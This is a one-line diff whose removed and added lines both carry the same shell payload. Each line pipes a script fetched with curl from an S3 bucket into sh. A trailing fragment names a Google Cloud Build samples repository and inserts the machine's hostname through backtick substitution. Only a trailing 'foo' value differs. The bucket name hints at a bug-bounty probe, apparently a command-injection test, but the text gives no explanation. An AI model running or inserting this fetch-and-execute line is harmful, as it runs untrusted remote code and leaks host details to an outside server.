@@ -1,1 +1,1 @@
-curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\&folder=run-example-builddeploy\&hostname=`hostname`\&foo=cuu
+curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/GoogleCloudPlatform/cloud-build-samples.git\&folder=run-example-builddeploy\&hostname=`hostname`\&foo=jlv
